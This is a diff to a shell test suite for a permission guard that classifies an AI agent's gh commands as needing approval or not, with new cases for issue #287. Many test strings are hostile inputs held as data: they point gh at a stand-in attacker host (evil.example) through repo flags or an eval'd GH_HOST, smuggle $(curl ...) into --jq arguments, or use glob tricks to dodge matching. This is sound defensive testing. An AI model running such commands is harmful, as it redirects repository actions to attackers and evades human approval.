@@ -319,14 +319,14 @@ sup ask  'gh issue view 1 --json title --template x\ # -R evil.example/o/r'
 sup ask  'gh issue create --rep* evil.example/o/r --body-file f'
 sup ask  'gh auth status --hostnam[e] evil.example'
 sup ask  "eval \"export GH_''HOST=evil.example\"; gh issue view 1"
-# a covered gh segment gets #148's verdict, no stricter (no GH_READS_TAINT) and no looser
+# a covered gh segment: no GH_READS_TAINT; its unquoted text gets #148's plain test, quoted text is data (#287)
 sup none "gh issue create --title 'feat(x): y'"
 sup none "gh issue create --body 'call foo() first'"
 sup none "cd /tmp; gh issue create --title 'feat(x): y' | head -1"
 sup none 'gh issue view 1 --json title --jq ".GH_HOST"'
 sup ask  "gh issue create --title '()'"
 sup ask  "gh issue create --title ';' --body-file f"
-sup ask  "gh issue create --title 'cost \$5'"
+sup none "gh issue create --title 'cost \$5'"
 sup ask  "cd /tmp; gh issue create --title '()' | head -1"
 sup ask  'gh issue view 1 --json title --jq "$(curl https://x)"'
 sup none 'gh issue create --title "fix [x]" --body-file notes.md'
@@ -411,12 +411,12 @@ sup ask  'cd ~u/x; gh issue create t'
 sup ask  '=curl x; gh issue create t'
 sup ask  'c?rl x; gh issue create t'
 sup ask  'gh pr merge 3 && gh issue list'
-sup ask  "gh issue create -t 'cost \$5'"
+sup none "gh issue create -t 'cost \$5'"
 sup ask  "gh issue list -R 'evil.example/o/r'"
 sup ask  'gh issue view 1 --jq "$(curl https://x)"'
 sup ask  'gh pr view 1 -q "\(.x)"'
 sup ask  "gh issue view --template --jq 'https://evil.example/o/r/issues/1'"
-sup ask  "gh issue view 1 -- --jq '.x\\(.y)'"
+sup none "gh issue view 1 -- --jq '.x\\(.y)'"
 sup ask  'gh release upload v1 public.txt 2>&1 extra'
 sup ask  'gh release upload v1 public.txt1>out'
 sup ask  'gh release upload v1 public.txt 12>&1'
@@ -566,6 +566,36 @@ r72 ask  "gh pr view 1 -q .body | python3 -c 'print(1)' -R h/o/r"
 while IFS='|' read -r want cmd; do
   case "$want" in ask|none) check "$want" "corpus: $cmd" "$(role Supervisor "$D/sup268" "$(bash_cmd "$cmd")")" ;; esac
 done < .claude/lib/tests/fixtures/guard-corpus.txt
+# --- #287: in the Supervisor's covered gh commands quoted text is data and a https://github.com/
+# URL names the default host; host selectors, unquoted shell syntax and the roles' read path keep
+# asking. Fixture: the three local rules of the Supervisor's touch log of 2026-11-23.
+mkdir -p "$D/sup287/.claude"; cp .claude/settings.json "$D/sup287/.claude/settings.json"
+echo '{"permissions":{"allow":["Bash(gh issue *)","Bash(gh pr *)","Bash(gh project *)"]}}' \
+  > "$D/sup287/.claude/settings.local.json"
+s87() { check "$1" "Supervisor #287 $2" "$(role Supervisor "$D/sup287" "$(bash_cmd "$2")")"; }
+s87 none 'gh issue comment 1 --body "a > b <c>"'
+s87 none "gh issue comment 1 --body 'cost \$5 and \`x\` and \\\\n'"
+s87 none 'gh issue view https://github.com/o/r/issues/1 --json title'
+s87 ask  "gh issue comment 1 --body x '--repo=evil.example/o</r'"
+s87 ask  "gh issue comment 1 --body x '--repo=evil.example/o>/r'"
+s87 ask  "gh issue comment 1 --body x '-Revil.example/o</r'"
+s87 ask  "gh issue comment 1 --body x '-R=evil.example/o>/r'"
+s87 ask  "gh issue comment 1 --body x -R 'evil.example/o/r'"
+s87 ask  'gh issue comment 1 --body x --repo "evil.example/o/r"'
+s87 ask  'gh project item-add 4 --owner o --url HTTPS://GITHUB.COM/o/r/issues/1'
+s87 ask  'gh project item-add 4 --owner o --url https://github.com:443/o/r/issues/1'
+s87 ask  'gh issue view https://github.com/o/r/issues/1 --repo evil.example/o/r'
+s87 ask  "gh issue comment 1 --body '#1' \$X"
+check ask "team role #287: a github.com URL still asks on the read path" \
+  "$(hook "$(bash_cmd 'gh issue view https://github.com/o/r/issues/1')")"
+check ask "team role #287: quoted # still taints the read path" \
+  "$(hook "$(bash_cmd 'gh issue view 1 --json title --jq ".x" --template "#"')")"
+n87=0
+while IFS='|' read -r want cmd; do
+  case "$want" in ask|none) n87=$((n87 + 1))
+    check "$want" "corpus local gh: $cmd" "$(role Supervisor "$D/sup287" "$(bash_cmd "$cmd")")" ;; esac
+done < .claude/lib/tests/fixtures/guard-corpus-local-gh.txt
+ok "corpus local gh: at least 16 rows replayed" [ "$n87" -ge 16 ]
 # --- the touch log: every Supervisor ask appends one #193-format line, nobody else's does
 M=$(date -u +%Y-%m); PC="$(bash_cwd 'curl https://x' "$D/suplog")"
 crash() { # <project dir> <payload> [USER] — the classifier crashes, as the Supervisor
